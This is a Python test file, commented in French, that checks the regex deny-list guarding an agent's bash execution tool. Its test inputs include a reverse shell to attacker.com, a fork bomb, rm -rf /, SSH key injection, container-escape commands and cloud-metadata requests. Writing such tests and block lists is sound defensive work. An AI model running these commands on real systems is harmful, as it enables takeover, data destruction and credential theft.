"""
Vérifie que la blocklist de `bash_exec` attrape bien les patterns critiques
pour l'intégrité système/serveur (fix sécu C1), sans bloquer les commandes
légitimes de dev (git, python, npm, etc.).

On n'exécute JAMAIS `_bash_exec` ici — on teste uniquement la logique de
matching de patterns en reproduisant les regex compilées.
"""
from __future__ import annotations

import re


# Les patterns doivent rester synchronisés avec wolf_tools._bash_exec.
# En cas de divergence, ce test détecte la régression.
CRITICAL_PATTERNS = [
    r"rm\s+(-[a-z]*\s+)*(/|~|\$home)",
    r"rm\s+(-[a-z]*\s+)*/(etc|root|boot|bin|sbin|lib|usr|var|proc|sys|dev)(/|\s|$)",
    r"\bshutdown\b", r"\breboot\b", r"\bpoweroff\b",
    r"\b(useradd|userdel|usermod|groupadd|groupdel)\b",
    r">\s*.*authorized_keys",
    # Package managers système — couvre les formes courtes/longues
    r"\b(apt|apt-get|aptitude)\s+.*\b(install|remove|purge|upgrade|dist-upgrade|autoremove|reinstall)\b",
    r"\bdpkg\b[\s\S]*?\-{1,2}(install|remove|purge|unpack|i|r|P)\b",
    # Docker : bloque les sous-commandes de gestion d'autres containers
    r"\bdocker\s+(run|exec|kill|rm|rmi|stop|restart)\b",
    r"/var/run/docker\.sock",
    r"/proc/1/root",
    r"\bchroot\b", r"\bmount\s+",
    r"169\.254\.169\.254",
    r"bash\s+\-i\s+>&\s*/dev/tcp",
    r":\(\)\s*\{\s*:\|:",
]


def _matches_any(cmd: str) -> bool:
    cmd_lower = cmd.lower().strip()
    return any(re.search(p, cmd_lower) for p in CRITICAL_PATTERNS)


# ── Commandes qui DOIVENT être bloquées ────────────────────────────────

def test_blocks_rm_rf_root():
    assert _matches_any("rm -rf /")
    assert _matches_any("rm -rf /etc")
    assert _matches_any("RM -RF /VAR")  # case-insensitive
    assert _matches_any("rm -rf ~")


def test_blocks_system_shutdown():
    assert _matches_any("shutdown -h now")
    assert _matches_any("reboot")
    assert _matches_any("sudo poweroff")


def test_blocks_user_manipulation():
    assert _matches_any("useradd attacker")
    assert _matches_any("userdel legit_user")
    assert _matches_any("groupadd root")


def test_blocks_ssh_key_injection():
    assert _matches_any('echo "my-key" >> /root/.ssh/authorized_keys')
    assert _matches_any("cat evil.pub > /home/user/.ssh/authorized_keys")


def test_blocks_system_package_install():
    assert _matches_any("apt install curl")
    assert _matches_any("apt-get remove nginx")
    assert _matches_any("dpkg --install malicious.deb")


def test_blocks_container_escape():
    assert _matches_any("curl --unix-socket /var/run/docker.sock")
    assert _matches_any("chroot /proc/1/root bash")
    assert _matches_any("mount --bind / /mnt/host")


def test_blocks_cloud_metadata_access():
    assert _matches_any("curl http://169.254.169.254/latest/meta-data/")
    assert _matches_any("wget 169.254.169.254")


def test_blocks_reverse_shell_classic():
    assert _matches_any("bash -i >& /dev/tcp/attacker.com/4444 0>&1")


def test_blocks_fork_bomb():
    assert _matches_any(":(){ :|:& };:")


# ── Commandes LÉGITIMES qui ne doivent PAS être bloquées ──────────────

def test_allows_git_operations():
    assert not _matches_any("git status")
    assert not _matches_any("git commit -m 'fix: truc'")
    assert not _matches_any("git push origin main")


def test_allows_python_npm_node():
    assert not _matches_any("python -m pytest tests/")
    assert not _matches_any("npm install")
    assert not _matches_any("node index.js")
    assert not _matches_any("pip install --user requests")


def test_allows_file_read_in_workspace():
    assert not _matches_any("cat README.md")
    assert not _matches_any("ls -la")
    assert not _matches_any("grep TODO src/")


def test_allows_file_write_in_workspace():
    assert not _matches_any("echo 'hello' > notes.txt")
    assert not _matches_any("cp src.py dest.py")
    # Attention : ne pas bloquer les rm légitimes dans le workspace
    assert not _matches_any("rm old_file.txt")
    assert not _matches_any("rm -rf ./build")


def test_allows_docker_compose_in_workspace():
    # docker compose dans le workspace du projet (pas `docker run` = gestion)
    # Par contre, docker run/exec/kill sont bloqués (gestion d'autres containers).
    assert _matches_any("docker run --rm alpine")  # bloqué
    assert _matches_any("docker exec -it c1 bash")  # bloqué
    assert not _matches_any("docker compose build")  # permis
    assert not _matches_any("docker-compose ps")     # permis (pas de sub-cmd run/exec)
